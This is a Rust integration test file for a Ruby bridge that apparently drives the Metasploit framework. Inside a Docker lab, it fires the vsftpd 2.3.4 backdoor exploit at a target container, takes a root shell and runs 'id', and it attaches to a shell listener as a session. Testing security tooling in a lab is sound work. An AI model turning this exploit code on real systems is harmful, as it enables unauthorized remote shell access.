// =============================================================================
// Integration Tests - Target Container Tests
// =============================================================================
//
// These tests run INSIDE Docker where the integration-test container
// can reach target-linux directly on the Docker network.
//
// Run with:
//   docker compose -f docker/docker-compose.yml run --rm integration-test \
//     cargo test --manifest-path rust/bridge/Cargo.toml --test test_integration -- --nocapture
//
// IMPORTANT: All integration tests run in a single #[test] function because Magnus/Ruby
// requires one process per Ruby VM initialization. Each test file = separate process.
//
// =============================================================================

mod common;

use bridge::ruby_bridge;
use magnus::{value::ReprValue, Ruby, TryConvert, Value};
use std::{thread, time::Duration};

// =============================================================================
// Helper Functions
// =============================================================================

/// Get current session IDs from the framework
fn get_session_ids(framework: Value) -> Vec<i64> {
    let sessions =
        ruby_bridge::call_method(framework, "sessions", &[]).expect("Failed to get sessions");
    let session_keys =
        ruby_bridge::call_method(sessions, "keys", &[]).expect("Failed to get session keys");
    TryConvert::try_convert(session_keys).unwrap_or_else(|_| Vec::new())
}

/// Get a session object by ID
fn get_session(ruby: &Ruby, framework: Value, session_id: i64) -> Value {
    let sessions =
        ruby_bridge::call_method(framework, "sessions", &[]).expect("Failed to get sessions");
    let sid_val = ruby.integer_from_i64(session_id).as_value();
    ruby_bridge::call_method(sessions, "[]", &[sid_val]).expect("Failed to get session")
}

/// Wait for a new session to appear (returns session ID or None)
fn wait_for_new_session(
    framework: Value,
    existing_sessions: &[i64],
    timeout_secs: u64,
) -> Option<i64> {
    for attempt in 0..timeout_secs {
        thread::sleep(Duration::from_secs(1));

        let current_sessions = get_session_ids(framework);
        for sid in &current_sessions {
            if !existing_sessions.contains(sid) {
                return Some(*sid);
            }
        }

        if attempt % 5 == 0 && attempt > 0 {
            println!("      Waiting for session... ({}s)", attempt);
        }
    }
    None
}

/// Kill a session and ignore errors
fn kill_session(session: Value) {
    let _ = ruby_bridge::call_method(session, "kill", &[]);
}

// =============================================================================
// Main Integration Test
// =============================================================================

/// Run all integration tests against the target container
///
/// This single test function runs all sub-tests sequentially because
/// Magnus/Ruby can only be initialized once per process.
#[test]
fn it_runs_integration_tests() {
    let env = match common::require_integration_env() {
        Some(env) => env,
        None => return,
    };

    println!("\n{}", "=".repeat(60));
    println!(" Integration Tests - Target Container ");
    println!("{}\n", "=".repeat(60));

    let (ruby, framework) = common::init_framework();

    // Run each sub-test
    let mut passed = 0;
    let mut failed = 0;

    // Test 1: vsftpd exploit
    match run_vsftpd_exploit_test(&ruby, framework, &env) {
        Ok(_) => passed += 1,
        Err(e) => {
            println!("   ❌ FAILED: {}\n", e);
            failed += 1;
        }
    }

    // Test 2: Session management
    match run_session_management_test(&ruby, framework, &env) {
        Ok(_) => passed += 1,
        Err(e) => {
            println!("   ❌ FAILED: {}\n", e);
            failed += 1;
        }
    }

    // Test 3: Shell listener (direct socket connection)
    match run_shell_listener_test(&ruby, framework, &env) {
        Ok(_) => passed += 1,
        Err(e) => {
            println!("   ❌ FAILED: {}\n", e);
            failed += 1;
        }
    }

    // Summary
    println!("\n{}", "=".repeat(60));
    println!(" Results: {} passed, {} failed ", passed, failed);
    println!("{}\n", "=".repeat(60));

    assert_eq!(failed, 0, "Some integration tests failed");
}

// =============================================================================
// Sub-Test: vsftpd 2.3.4 Backdoor Exploit
// =============================================================================

fn run_vsftpd_exploit_test(
    ruby: &Ruby,
    framework: Value,
    env: &common::IntegrationEnv,
) -> Result<(), String> {
    println!("🎯 Test: vsftpd 2.3.4 Backdoor Exploit");
    println!("   Target: {}:{}", env.target_host, env.ftp_port);

    let sessions_before = get_session_ids(framework);

    // Create the exploit module
    println!("   [1/6] Creating exploit module...");
    let modules = ruby_bridge::call_method(framework, "modules", &[])
        .map_err(|e| format!("Failed to get modules: {}", e))?;
    let module_name = ruby
        .str_new("exploit/unix/ftp/vsftpd_234_backdoor")
        .as_value();
    let module = ruby_bridge::call_method(modules, "create", &[module_name])
        .map_err(|e| format!("Failed to create module: {}", e))?;

    if module.is_nil() {
        return Err("Module not found".to_string());
    }

    // Configure the exploit
    println!("   [2/6] Configuring exploit...");
    let datastore = ruby_bridge::call_method(module, "datastore", &[])
        .map_err(|e| format!("Failed to get datastore: {}", e))?;

    let rhosts_key = ruby.str_new("RHOSTS").as_value();
    let rhosts_val = ruby.str_new(&env.target_host).as_value();
    ruby_bridge::call_method(datastore, "[]=", &[rhosts_key, rhosts_val])
        .map_err(|e| format!("Failed to set RHOSTS: {}", e))?;

    let rport_key = ruby.str_new("RPORT").as_value();
    let rport_val = ruby.str_new(&env.ftp_port.to_string()).as_value();
    ruby_bridge::call_method(datastore, "[]=", &[rport_key, rport_val])
        .map_err(|e| format!("Failed to set RPORT: {}", e))?;

    // Run the exploit
    println!("   [3/6] Running exploit...");
    let opts = ruby.hash_new().as_value();

    let payload_key = ruby.str_new("Payload").as_value();
    let payload_val = ruby.str_new("cmd/unix/interact").as_value();
    ruby_bridge::call_method(opts, "[]=", &[payload_key, payload_val])
        .map_err(|e| format!("Failed to set Payload: {}", e))?;

    let quiet_key = ruby.str_new("Quiet").as_value();
    let quiet_val = ruby.qtrue().as_value();
    ruby_bridge::call_method(opts, "[]=", &[quiet_key, quiet_val])
        .map_err(|e| format!("Failed to set Quiet: {}", e))?;

    let _ = ruby_bridge::call_method(module, "exploit_simple", &[opts]);

    // Wait for session
    println!("   [4/6] Waiting for session...");
    let session_id = wait_for_new_session(framework, &sessions_before, 10)
        .ok_or_else(|| "No session created - exploit failed".to_string())?;

    println!("         ✓ Got session: {}", session_id);

    let session = get_session(ruby, framework, session_id);

    // Test session operations
    println!("   [5/6] Testing session...");

    let type_val = ruby_bridge::call_method(session, "type", &[])
        .map_err(|e| format!("Failed to get type: {}", e))?;
    let session_type = ruby_bridge::value_to_string(type_val).unwrap_or_default();

    if !session_type.to_lowercase().contains("shell")
        && !session_type.to_lowercase().contains("command")
    {
        return Err(format!("Expected shell session, got: {}", session_type));
    }

    // Test shell I/O
    let cmd = ruby.str_new("id\n").as_value();
    ruby_bridge::call_method(session, "shell_write", &[cmd])
        .map_err(|e| format!("Failed to write: {}", e))?;

    thread::sleep(Duration::from_millis(500));

    let output_val = ruby_bridge::call_method(session, "shell_read", &[])
        .map_err(|e| format!("Failed to read: {}", e))?;
    let output = ruby_bridge::value_to_string(output_val).unwrap_or_default();

    if !output.contains("uid=") && !output.contains("root") {
        return Err(format!("Expected uid info, got: {}", output));
    }
    println!("         ✓ Shell I/O works: {}", output.trim());

    // Cleanup
    println!("   [6/6] Cleaning up...");
    kill_session(session);

    println!("   ✅ vsftpd exploit test passed!\n");
    Ok(())
}

// =============================================================================
// Sub-Test: Session Management
// =============================================================================

fn run_session_management_test(
    ruby: &Ruby,
    framework: Value,
    env: &common::IntegrationEnv,
) -> Result<(), String> {
    println!("📋 Test: Session Management");
    println!("   Target: {}:{}", env.target_host, env.ftp_port);

    // Test session listing
    println!("   [1/2] Testing session listing...");
    let session_ids = get_session_ids(framework);
    println!("         ✓ Found {} sessions", session_ids.len());

    // Test session info
    if !session_ids.is_empty() {
        println!("   [2/2] Testing session info...");
        for sid in &session_ids {
            let session = get_session(ruby, framework, *sid);

            let type_val = ruby_bridge::call_method(session, "type", &[]).ok();
            let stype = type_val
                .and_then(|v| ruby_bridge::value_to_string(v).ok())
                .unwrap_or_else(|| "unknown".to_string());

            println!("         Session {}: type={}", sid, stype);
        }
    } else {
        println!("   [2/2] No sessions to inspect");
    }

    println!("   ✅ Session management test passed!\n");
    Ok(())
}

// =============================================================================
// Sub-Test: Shell Listener Connection (Direct Socket)
// =============================================================================

fn run_shell_listener_test(
    ruby: &Ruby,
    framework: Value,
    env: &common::IntegrationEnv,
) -> Result<(), String> {
    println!("🔌 Test: Shell Listener (Direct Socket Connection)");
    println!("   Target: {}:{}", env.target_host, env.shell_port);

    let sessions_before = get_session_ids(framework);

    // Step 1: Create Rex socket connection to the shell listener
    println!("   [1/5] Creating socket connection...");

    // Get Rex::Socket::Tcp class
    let rex_socket_tcp = ruby
        .eval::<Value>("Rex::Socket::Tcp")
        .map_err(|e| format!("Failed to get Rex::Socket::Tcp: {}", e))?;

    // Build options hash for connection
    let opts = ruby.hash_new().as_value();
    let peer_host_key = ruby.str_new("PeerHost").as_value();
    let peer_host_val = ruby.str_new(&env.target_host).as_value();
    ruby_bridge::call_method(opts, "[]=", &[peer_host_key, peer_host_val])
        .map_err(|e| format!("Failed to set PeerHost: {}", e))?;

    let peer_port_key = ruby.str_new("PeerPort").as_value();
    let peer_port_val = ruby.integer_from_i64(env.shell_port as i64).as_value();
    ruby_bridge::call_method(opts, "[]=", &[peer_port_key, peer_port_val])
        .map_err(|e| format!("Failed to set PeerPort: {}", e))?;

    // Set a connection timeout
    let timeout_key = ruby.str_new("Timeout").as_value();
    let timeout_val = ruby.integer_from_i64(10).as_value();
    ruby_bridge::call_method(opts, "[]=", &[timeout_key, timeout_val])
        .map_err(|e| format!("Failed to set Timeout: {}", e))?;

    // Create the socket connection
    let socket = ruby_bridge::call_method(rex_socket_tcp, "create", &[opts])
        .map_err(|e| format!("Failed to create socket: {}", e))?;

    if socket.is_nil() {
        return Err("Socket connection failed - returned nil".to_string());
    }
    println!("         ✓ Socket connected");

    // Step 2: Create CommandShell session from socket
    println!("   [2/5] Creating CommandShell session...");

    let cmd_shell_class = ruby
        .eval::<Value>("Msf::Sessions::CommandShell")
        .map_err(|e| format!("Failed to get CommandShell class: {}", e))?;

    let session = ruby_bridge::call_method(cmd_shell_class, "new", &[socket])
        .map_err(|e| format!("Failed to create CommandShell: {}", e))?;

    if session.is_nil() {
        return Err("Failed to create CommandShell session".to_string());
    }
    println!("         ✓ CommandShell created");

    // Step 3: Register session with framework
    println!("   [3/5] Registering session...");

    let sessions_manager =
        ruby_bridge::call_method(framework, "sessions", &[]).map_err(|e| format!("{}", e))?;

    ruby_bridge::call_method(sessions_manager, "register", &[session])
        .map_err(|e| format!("Failed to register session: {}", e))?;

    // Give it a moment to register
    thread::sleep(Duration::from_millis(500));

    // Find the new session ID
    let session_id = wait_for_new_session(framework, &sessions_before, 5)
        .ok_or_else(|| "Session not registered".to_string())?;

    println!("         ✓ Session registered: {}", session_id);

    // Step 4: Test shell I/O
    println!("   [4/5] Testing shell I/O...");

    // Write a command
    let cmd = ruby.str_new("id\n").as_value();
    ruby_bridge::call_method(session, "shell_write", &[cmd])
        .map_err(|e| format!("Failed to write: {}", e))?;

    thread::sleep(Duration::from_millis(500));

    // Read the output
    let output_val = ruby_bridge::call_method(session, "shell_read", &[])
        .map_err(|e| format!("Failed to read: {}", e))?;
    let output = ruby_bridge::value_to_string(output_val).unwrap_or_default();

    if !output.contains("uid=") && !output.contains("root") {
        return Err(format!("Expected uid info, got: {}", output));
    }
    println!("         ✓ Shell I/O works: {}", output.trim());

    // Step 5: Cleanup
    println!("   [5/5] Cleaning up...");
    kill_session(session);

    println!("   ✅ Shell listener test passed!\n");
    Ok(())
}
